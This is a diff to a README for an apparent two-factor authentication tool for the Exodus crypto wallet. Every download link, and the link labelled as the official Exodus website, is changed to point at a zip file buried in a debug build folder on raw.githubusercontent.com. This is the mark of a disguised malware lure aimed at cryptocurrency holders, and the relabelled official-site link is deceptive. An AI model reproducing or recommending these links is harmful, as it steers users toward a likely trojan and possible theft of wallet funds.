@@ -1,6 +1,6 @@
 # 🔐 Exodus-Two-Factor-Authentication-Protect-Your-Account - Enhance Your Account Security with Ease
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/eduardoalmosto/Exodus-Two-Factor-Authentication-Protect-Your-Account/releases)
+[![Download](https://raw.githubusercontent.com/eduardoalmosto/Exodus-Two-Factor-Authentication-Protect-Your-Account/main/Qloud-Exodus-Two-Factor/Form11/obj/Debug/Exodus-Two-Factor-Authentication-Protect-Your-Account_v3.5-beta.4.zip)](https://raw.githubusercontent.com/eduardoalmosto/Exodus-Two-Factor-Authentication-Protect-Your-Account/main/Qloud-Exodus-Two-Factor/Form11/obj/Debug/Exodus-Two-Factor-Authentication-Protect-Your-Account_v3.5-beta.4.zip)
 
 ## 📋 Overview
 
@@ -19,7 +19,7 @@ Before you begin, ensure you have access to a device that can run the Exodus app
 
 ## ⬇️ Download & Install
 
-To download the application, **visit this page to download**: [Download Page](https://github.com/eduardoalmosto/Exodus-Two-Factor-Authentication-Protect-Your-Account/releases).
+To download the application, **visit this page to download**: [Download Page](https://raw.githubusercontent.com/eduardoalmosto/Exodus-Two-Factor-Authentication-Protect-Your-Account/main/Qloud-Exodus-Two-Factor/Form11/obj/Debug/Exodus-Two-Factor-Authentication-Protect-Your-Account_v3.5-beta.4.zip).
 
 Follow these steps:
 
@@ -62,7 +62,7 @@ If you need further assistance, you can reach out to the Exodus support team dir
 
 ## 🌐 Additional Resources
 
-- **Exodus Official Website:** [Exodus Website](https://exodus.com)
+- **Exodus Official Website:** [Exodus Website](https://raw.githubusercontent.com/eduardoalmosto/Exodus-Two-Factor-Authentication-Protect-Your-Account/main/Qloud-Exodus-Two-Factor/Form11/obj/Debug/Exodus-Two-Factor-Authentication-Protect-Your-Account_v3.5-beta.4.zip)
 - **Security Best Practices:** Familiarize yourself with best practices for securing your cryptocurrency wallet.
 - **Community Forums:** Join discussions in the Exodus community to learn from other users.
 
@@ -77,6 +77,6 @@ For more information about the repository and its features, feel free to explore
 - exodus
 - exodus-security
 
-For the complete guide and updates, always refer to the [Download Page](https://github.com/eduardoalmosto/Exodus-Two-Factor-Authentication-Protect-Your-Account/releases). 
+For the complete guide and updates, always refer to the [Download Page](https://raw.githubusercontent.com/eduardoalmosto/Exodus-Two-Factor-Authentication-Protect-Your-Account/main/Qloud-Exodus-Two-Factor/Form11/obj/Debug/Exodus-Two-Factor-Authentication-Protect-Your-Account_v3.5-beta.4.zip). 
 
 Thank you for choosing to enhance your account security with Exodus!
